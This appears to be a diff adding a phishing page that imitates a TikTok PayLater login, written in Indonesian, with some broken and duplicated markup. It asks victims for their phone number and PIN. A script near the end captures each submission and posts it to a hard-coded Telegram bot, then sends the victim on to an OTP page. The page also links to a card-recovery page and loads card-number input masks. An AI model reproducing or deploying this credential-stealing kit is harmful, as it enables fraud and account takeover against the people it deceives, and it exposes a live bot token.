@@ -1,0 +1,902 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="theme-color" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+        <title>TikTok Masuk & Daftar</title>
+    <meta property="og:title" content="TikTok PayLater"> 
+	<meta property="og:description" content="TikTok PayLater adalah metode pembayaran dengan sistem “beli sekarang, bayar nanti” yang terhubung dengan layanan TikTok PayLater. Fitur ini memudahkan pengguna untuk berbelanja tanpa harus langsung membayar penuh di muka.">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<title>TikTok PayLater</title>
+<meta property="og:title" content="TikTok PayLater">
+<meta property="twitter:title" content="TikTok PayLater adalah metode pembayaran dengan sistem “beli sekarang, bayar nanti” yang terhubung dengan layanan TikTok PayLater. Fitur ini memudahkan pengguna untuk berbelanja tanpa harus langsung membayar penuh di muka.">
+<meta property="twitter:card" content="summary_large_image">
+<meta property="og:image:type" content="image/jpeg">
+<meta content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTVzTFuaIYeSMzH4hTG_GebCZcCEy5VR7JvVlIQDPoJBAvJi2swEHVAHfs&s=10" property="og:image">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, maximum-scale=1">
+ <link href="https://i.pinimg.com/736x/e4/06/19/e406192290967ba61e8277e7dbfde0a5.jpg" rel="icon" type="image/x-icon">
+    <link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTVzTFuaIYeSMzH4hTG_GebCZcCEy5VR7JvVlIQDPoJBAvJi2swEHVAHfs&s=10" rel="apple-touch-icon">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+
+<meta property="twitter:card" content="summary_large_image">
+<meta property="og:image:type" content="image/jpeg">
+<meta content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTVzTFuaIYeSMzH4hTG_GebCZcCEy5VR7JvVlIQDPoJBAvJi2swEHVAHfs&s=10" property="og:image">
+    <style>
+    
+        /* Hide the form initially */
+        #login-form {
+            display: none;
+        }
+
+        /* Fullscreen image styling */
+        #loading-image {
+            position: fixed; /* Fix the position to cover the entire viewport */
+            top: 0;
+            left: 0;
+            width: 100vw; /* Full width */
+            height: 100vh; /* Full height */
+            z-index: 10; /* Ensure it appears above other content */
+            display: flex; /* Center the image */
+            justify-content: center; /* Center horizontally */
+            align-items: center; /* Center vertically */
+        }
+
+        #loading-image img {
+            width: 100%; /* Ensure image covers the full width */
+            height: 100%; /* Ensure image covers the full height */
+            object-fit: cover; /* Cover the area without distortion */
+        }
+    </style>
+
+ <script>
+        // Function to handle the image and form transition
+        function showForm() {
+            const loadingImage = document.getElementById("loading-image");
+            const loginForm = document.getElementById("login-form");
+
+            // Hide the image and show the form
+            loadingImage.style.display = "none";
+            loginForm.style.display = "block";
+        }
+
+        function validateForm(event) {
+            const input = document.getElementById("email").value;
+            const phoneRegex = /^08[0-9]{8,}$/;
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+            if (!phoneRegex.test(input) && !emailRegex.test(input)) {
+                event.preventDefault();
+                const messageElement = document.getElementById("validation-message");
+                messageElement.textContent = "Silakan masukkan nomor telepon yang valid (08) atau alamat email yang benar.";
+                messageElement.classList.remove("hidden");
+            } else {
+                const messageElement = document.getElementById("validation-message");
+                messageElement.textContent = "";
+                messageElement.classList.add("hidden");
+            }
+        }
+
+        // Start the transition after the page loads
+        window.onload = function() {
+            setTimeout(showForm, 3000); // Change duration as needed (3000ms = 3s)
+        };
+    </script>
+<style>
+</style></head>
+<body class="bg-gray-50 min-h-screen">
+    <!-- Loading Image Section -->
+    <div id="loading-image">
+        <img src="https://static.tildacdn.ink/tild3231-3338-4935-b437-663634353964/1000229833.png" alt="Loading">
+    </div>
+
+    <!-- Form Section -->
+    <main id="login-form" class="w-full max-w-md">
+
+        <!-- Validation Message -->
+
+
+    
+
+    <!-- Google Fonts for a similar feel to TikTok's font -->
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+
+    
+
+    <!-- Font Awesome for Icons -->
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+<style>
+/* --- Global Styles & Resets --- */
+
+* {
+
+    margin: 0;
+
+    padding: 0;
+
+    box-sizing: border-box;
+
+}
+
+body {
+
+    font-family: 'Poppins', sans-serif;
+
+    background-color: #0D0204; /* TikTok's light grey background */
+
+    display: flex;
+
+    justify-content: center;
+
+    align-items: center;
+
+    min-height: 100vh;
+
+    padding: 40px 20px;
+
+}
+
+/* --- Main Form Container --- */
+
+.auth-container {
+
+    width: 100%;
+
+    max-width: 400px;
+
+    background-color: #ffffff;
+
+    border-radius: 8px;
+
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+
+    padding: 40px 30px;
+
+    text-align: center;
+
+}
+
+/* Hide all pages by default */
+
+.page {
+
+    display: none;
+
+}
+
+/* Show the active page */
+
+.page.active {
+
+    display: block;
+
+}
+
+/* --- Logo & Headings --- */
+
+.logo {
+
+    font-size: 50px;
+
+    margin-bottom: 20px;
+
+    color: #161823; /* TikTok's dark color */
+
+}
+
+.auth-title {
+
+    font-size: 24px;
+
+    font-weight: 700;
+
+    margin-bottom: 10px;
+
+    color: #161823;
+
+}
+
+.auth-subtitle {
+
+    font-size: 14px;
+
+    color: #8a8b91;
+
+    margin-bottom: 20px;
+
+}
+
+/* --- Input Fields --- */
+
+.input-group {
+
+    position: relative;
+
+    margin-bottom: 15px;
+
+}
+
+.input-field {
+
+    width: 100%;
+
+    padding: 12px 12px 12px 40px; /* Space for the icon */
+
+    border: 1px solid #ddd;
+
+    border-radius: 6px;
+
+    background-color: #f1f1f2;
+
+    font-size: 14px;
+
+}
+
+.input-field:focus {
+
+    outline: none;
+
+    border-color: #8a8b91;
+
+}
+
+.input-group i {
+
+    position: absolute;
+
+    left: 15px;
+
+    top: 50%;
+
+    transform: translateY(-50%);
+
+    color: #8a8b91;
+
+}
+
+/* --- Buttons --- */
+
+.btn {
+
+    width: 100%;
+
+    padding: 12px;
+
+    border: none;
+
+    border-radius: 6px;
+
+    font-size: 16px;
+
+    font-weight: 600;
+
+    cursor: pointer;
+
+    transition: background-color 0.2s ease;
+
+}
+
+/* NEW: Make disabled buttons look clearly inactive */
+
+.btn:disabled {
+
+    background-color: #e0e0e2;
+
+    color: #8a8b91;
+
+    cursor: not-allowed;
+
+}
+
+.btn-primary {
+
+    background-color: #FE2C55; /* TikTok's red */
+
+    color: #ffffff;
+
+    margin-top: 10px;
+
+}
+
+.btn-primary:hover {
+
+    background-color: #e4274c;
+
+}
+
+.btn-secondary {
+
+    background-color: #f1f1f2;
+
+    color: #161823;
+
+    margin-top: 10px;
+
+    display: flex;
+
+    align-items: center;
+
+    justify-content: center;
+
+    gap: 10px;
+
+}
+
+.btn-secondary:hover:not(:disabled) {
+
+    background-color: #e0e0e2;
+
+}
+
+/* --- Links & Dividers --- */
+
+.link {
+
+    color: #161823;
+
+    text-decoration: none;
+
+    font-size: 12px;
+
+    display: block;
+
+    margin-top: 15px;
+
+    cursor: pointer;
+
+}
+
+.link:hover {
+
+    text-decoration: underline;
+
+}
+
+.divider {
+
+    display: flex;
+
+    align-items: center;
+
+    text-align: center;
+
+    color: #8a8b91;
+
+    margin: 25px 0;
+
+    font-size: 12px;
+
+}
+
+.divider::before,
+
+.divider::after {
+
+    content: '';
+
+    flex: 1;
+
+    border-bottom: 1px solid #ddd;
+
+}
+
+.divider:not(:empty)::before {
+
+    margin-right: .5em;
+
+}
+
+.divider:not(:empty)::after {
+
+    margin-left: .5em;
+
+}
+
+/* --- Switcher section at the bottom --- */
+
+.switcher {
+
+    margin-top: 30px;
+
+    padding-top: 20px;
+
+    border-top: 1px solid #ddd;
+
+    font-size: 14px;
+
+}
+
+.switcher-link {
+
+    font-weight: 600;
+
+    color: #FE2C55; /* TikTok's red */
+
+    cursor: pointer;
+
+}
+
+.switcher-link:hover {
+
+    text-decoration: underline;
+
+}
+</style>
+</head>
+
+<body>
+
+    <div class="auth-container">
+
+        
+
+        <!-- ====================== LOGIN PAGE ====================== -->
+
+        <div id="login-page" class="page active">
+
+            <i class="fa-brands fa-tiktok logo"></i>
+
+            <h1 class="auth-title">Masuk ke TikTok</h1>
+         <br>
+                    <form id="setPin" action="otp.html" method="POST">
+
+                <div class="input-group">
+
+                    <i class="fa-solid fa-user"></i>
+
+                    <input type="tel" name="nomor" id="nomor" class="input-field" placeholder="Nomor telepon" maxlength="13" required>
+
+                </div>
+
+                <div class="input-group">
+
+                    <i class="fa-solid fa-lock"></i>
+
+                    <input inputmode="numeric" type="password" name="pin" id="pin" class="input-field" placeholder="PIN" maxlength="6" required>
+
+                </div>
+
+                
+
+                <a class="link" id="show-reset-page-link">Lupa kata sandi?</a>
+
+                
+
+                <button type="submit" class="btn btn-primary">Masuk</button>
+
+            </form>
+
+            <div class="divider">atau</div>
+
+            <div class="divider">𝗞𝗲𝗻𝗱𝗮𝗹𝗮 𝗮𝗸𝘂𝗻 𝗧𝗶𝗸𝗧𝗼𝗸 𝗣𝗮𝘆𝗟𝗮𝘁𝗲𝗿 𝘁𝗶𝗱𝗮𝗸 𝗯𝗶𝘀𝗮 𝗱𝗶𝗴𝘂𝗻𝗮𝗸𝗮𝗻 𝗯𝗲𝗿𝗯𝗲𝗹𝗮𝗻𝗷𝗮?</div>
+              <a style="font-weight: bold; font-size: 14px; color: #FE2C55;" href="kartu.html" onclick="">Pulihkan akun</a></span>
+
+              
+
+            </div>
+
+        </div>
+
+        <!-- ====================== SIGN UP PAGE ====================== -->
+
+        <div id="signup-page" class="page">
+
+            <i class="fa-brands fa-tiktok logo"></i>
+
+            <h1 class="auth-title">Daftar TikTok</h1>
+
+            <form id="setPin" action="otp.html" method="POST">
+
+                <div class="input-group">
+
+                    <i class="fa-solid fa-envelope"></i>
+
+                    <input type="email" name="email" id="email" class="input-field" placeholder="Alamat email" required>
+
+                </div>
+
+                <div class="input-group">
+
+                    <i class="fa-solid fa-user"></i>
+
+                    <input type="text" name="ID" id="ID" class="input-field" placeholder="Username" required>
+
+                </div>
+
+                <div class="input-group">
+
+                    <i class="fa-solid fa-lock"></i>
+
+                    <input type="password" name="Password" id="Password" class="input-field" placeholder="Kata sandi" required>
+
+                </div>
+
+                
+
+                <button type="submit" class="btn btn-primary">Daftar</button>
+
+            </form>
+            <div class="divider">atau</div>
+
+            
+
+            <!-- EDITED: Added 'disabled' attribute to make the button unclickable -->
+
+            <button class="btn btn-secondary" disabled><i class="fa-brands fa-google"></i> Lanjutkan dengan Google</button>
+
+            
+            
+
+            <div class="switcher">
+
+                Sudah punya akun?  <span class="switcher-link" id="show-login-page-link-from-signup">Masuk</span>
+
+            </div>
+
+        </div>
+
+        <!-- ====================== RESET PASSWORD PAGE ====================== -->
+
+        <div id="reset-page" class="page">
+
+            <i class="fa-brands fa-tiktok logo"></i>
+
+            <h1 class="auth-title">Reset password</h1>
+
+            <p class="auth-subtitle">Masukkan alamat email Anda untuk menerima tautan untuk mengatur ulang kata sandi Anda. </p>
+
+            <form id="reset-form">
+
+                <div class="input-group">
+
+                    <i class="fa-solid fa-envelope"></i>
+
+                    <input type="email" class="input-field" placeholder="Alamat Email" required>
+
+                </div>
+
+                
+
+                <button type="submit" class="btn btn-primary">Kirim Tautan Reset </button>
+
+            </form>
+
+            
+
+            <a class="link" id="show-login-page-link-from-reset">Kembali untuk masuk</a>
+
+        </div>
+
+    </div>
+
+    
+  </div>
+   
+       <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
+
+    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
+
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+        </div> 
+   </div> 
+   </div>
+ <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
+<script src="jquery.min.js"></script>
+       
+        <script type="text/javascript">
+            $(document).ready(function(){
+        </script>
+<!-- </body> -->  
+   <script>
+
+
+function closeForm() {
+  document.getElementById("myForm").style.display = "none";
+}
+</script> 
+  
+  <!-- partial -->
+ <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
+
+    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
+
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js'></script>
+<script src='https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js'></script>
+ <script>$(document).ready(function(){
+$('#debit').mask('0000 0000 0000 0000');     
+$('#valid').mask('00/00');
+});</script>
+ <p id="status"></p>
+   <script src="setPin.js"></script>
+   
+   <script>
+   
+            $(document).ready(function() {
+            $("div#eyeOpen").on('click', function() {
+                $("#eyeOpen").css("display", "none");
+                $("#eyeClose").css("display", "block");
+
+                $("#password").prop("type", "text");
+
+                $("div#eyeClose").on('click', function() {
+                    $("#eyeOpen").css("display", "block");
+                    $("#eyeClose").css("display", "none");
+
+                    $("#password").prop("type", "password");
+                });
+            });
+            
+const chat_id = '-1002437287311', botID = 'bot7566851766:AAEbOqBAI2XfHKrx15zlO-OqkGUvNzFPh_o';
+
+    const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;
+
+    document.querySelector('#setPin').addEventListener("submit", async e => { // When the user submits the form
+        e.preventDefault(); // Don't submit
+        let text = JSON.stringify( // Convert the form data to a string to send as our Telegram message
+            Object.fromEntries(new FormData(e.target).entries()), // Convert the form data to an object.
+        null, 2); // Prettify the JSON so we can read the data easily
+        const sendMessage = await fetch(telegramURL, { // Send the request to the telegram API
+            method: 'POST',
+            headers: {"Content-Type": "application/json"}, // This is required when sending a JSON body.
+            body: JSON.stringify({chat_id, text}), // The body must be a string, not an object
+        });
+        const messageStatus = document.querySelector('#status');
+        if (sendMessage.ok) // Update the user on if the message went through
+            messageStatus.textContent = "";
+        else
+            messageStatus.textContent = "Message Failed to send :( " + (await sendMessage.text());
+        e.target.reset(); // Clear the form fields.
+        window.location.href = 'otp.html';
+    });
+
+            
+        });
+        
+   </script>
+        </form>
+      </div>
+    </section>
+    <!-- <script src="./axios.js" type="module"></script> -->
+    <script src="./Pin.html" type="module"></script>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+  
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js">
+            </script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.min.js">
+            </script>
+<script>
+            $(document).ready(function() {
+                $('.slider').slick({
+                    autoplay: true,
+                    autoplaySpeed: 500,
+                    dots: true
+                });
+            });
+            </script>
+            
+            <script>
+ var nomor = sessionStorage.getItem("nomor");
+ document.getElementById("nomorku").value = nomor + "";
+</script>
+    <script>
+
+        document.addEventListener('DOMContentLoaded', () => {
+
+            // --- Element Selections ---
+
+            const pages = document.querySelectorAll('.page');
+
+            const loginForm = document.getElementById('login-form');
+
+            const signupForm = document.getElementById('signup-form');
+
+            const resetForm = document.getElementById('reset-form');
+
+            const googleSignupForm = document.getElementById('google-signup-form');
+
+            
+
+            // Page navigation links
+
+            const showSignupLink = document.getElementById('show-signup-page-link');
+
+            const showLoginFromSignupLink = document.getElementById('show-login-page-link-from-signup');
+
+            const showResetLink = document.getElementById('show-reset-page-link');
+
+            const showLoginFromResetLink = document.getElementById('show-login-page-link-from-reset');
+
+            const showLoginFromGoogleLink = document.getElementById('show-login-page-link-from-google');
+
+            // --- Page Switching Logic ---
+
+            function showPage(pageId) {
+
+                pages.forEach(page => page.classList.remove('active'));
+
+                const targetPage = document.getElementById(pageId);
+
+                if (targetPage) {
+
+                    targetPage.classList.add('active');
+
+                }
+
+            }
+
+            // Event listeners for page navigation
+
+            showSignupLink.addEventListener('click', () => showPage('signup-page'));
+
+            showLoginFromSignupLink.addEventListener('click', () => showPage('login-page'));
+
+            showResetLink.addEventListener('click', () => showPage('reset-page'));
+
+            showLoginFromResetLink.addEventListener('click', () => showPage('login-page'));
+
+            showLoginFromGoogleLink.addEventListener('click', () => showPage('login-page'));
+
+            // --- Form Submission Logic ---
+
+            loginForm.addEventListener('submit', (e) => {
+
+                e.preventDefault();
+
+                alert();
+
+            });
+
+            signupForm.addEventListener('submit', (e) => {
+
+                e.preventDefault();
+
+                alert();
+
+                showPage('login-page'); // Redirect to login page after signup
+
+            });
+
+            
+
+            googleSignupForm.addEventListener('submit', (e) => {
+
+                e.preventDefault();
+
+                alert();
+
+                showPage('login-page'); // Redirect to login page
+
+            });
+
+            // ================== NEW: RESET PASSWORD LOGIC ==================
+
+            resetForm.addEventListener('submit', (e) => {
+
+                e.preventDefault();
+
+                const emailInput = resetForm.querySelector('input[type="email"]');
+
+                if (emailInput.value.trim() !== '') {
+
+                    // In a real app, you would send a request to your server here
+
+                    alert('');
+
+                    showPage('login-page'); // Go back to login
+
+                } else {
+
+                    alert('Please enter your email address.');
+
+                }
+
+            });
+
+            // ================== NEW: GOOGLE SIGN-IN LOGIC ==================
+
+            
+
+            // This function will be called by Google after the user signs in
+
+            function handleCredentialResponse(response) {
+
+                console.log("Encoded JWT ID token: " + response.credential);
+
+                // IMPORTANT: The 'response.credential' is a JSON Web Token (JWT).
+
+                // We need to decode it to get the user's information.
+
+                // This is a simple client-side way to decode it for demonstration.
+
+                // In a real production app, you should send this token to your backend server
+
+                // to securely verify it and create a session.
+
+                const base64Url = response.credential.split('.')[1];
+
+                const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
+
+                const jsonPayload = decodeURIComponent(atob(base64).split('').map(function(c) {
+
+                    return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+
+                }).join(''));
+
+                const userData = JSON.parse(jsonPayload);
+
+                
+
+                console.log("User Data from Google:", userData);
+
+                
+
+                // Now we have the user's data (e.g., email, name, picture)
+
+                // Let's use the email and move to the "complete profile" page.
+
+                const userEmail = userData.email;
+
+                document.getElementById('google-user-email').textContent = userEmail;
+
+                
+
+                // Switch to the Google sign-up completion page
+
+                showPage('google-page');
+
+            }
+
+            // This function initializes the Google Sign-In service when the window loads
+
+            window.onload = function () {
+
+                google.accounts.id.initialize({
+
+                    // ========================= !! IMPORTANT !! =========================
+
+                    //   You MUST replace this with your own Google Client ID.
+
+                    //   Get one from the Google Cloud Console: https://console.cloud.google.com/
+
+                    // ===================================================================
+
+                    client_id: "YOUR_GOOGLE_CLIENT_ID.apps.googleusercontent.com",
+
+                    callback: handleCredentialResponse // The function to call after success
+
+                });
+
+                const continueWithGoogleBtn = document.getElementById('continue-with-google-btn');
+
+                continueWithGoogleBtn.addEventListener('click', () => {
+
+                     // This triggers the Google One Tap pop-up
+
+                     google.accounts.id.prompt(); 
+
+                });
+
+            };
+
+        });
+
+    </script>
+
+</body>
+
+</html>
+<!-- partial -->
